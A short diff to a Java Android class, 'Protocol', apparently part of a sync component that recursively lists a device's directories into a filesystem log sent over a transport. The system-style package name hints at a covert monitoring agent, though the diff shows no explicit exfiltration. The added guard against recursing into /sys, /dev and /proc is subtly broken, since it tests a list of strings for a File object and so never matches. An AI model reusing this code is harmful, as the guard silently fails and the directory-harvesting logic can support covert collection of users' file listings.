@@ -11,7 +11,10 @@ package com.android.networking.action.sync;
 
 import java.io.File;
 import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Date;
+import java.util.List;
 import java.util.Vector;
 
 import android.content.Intent;
@@ -48,6 +51,8 @@ public abstract class Protocol implements iProtocol {
 	protected Transport transport;
 
 	Status status;
+	
+	static List<String> blackListDir = Arrays.asList(new String[]{"/sys", "/dev", "/proc"});
 
 	/** The reload. */
 	// public boolean reload;
@@ -470,6 +475,7 @@ public abstract class Protocol implements iProtocol {
 		}
 		final File dir = new File(path);
 		if (dir.isDirectory()) {
+			
 			final String[] files = dir.list();
 			if (files == null) {
 				return;
@@ -488,7 +494,9 @@ public abstract class Protocol implements iProtocol {
 
 				final boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
 				if (isDir && depth > 1) {
-					expandPath(fsLog, dPath, depth - 1);
+					if(!blackListDir.contains(dir)){
+						expandPath(fsLog, dPath, depth - 1);
+					}
 				}
 			}
 		}
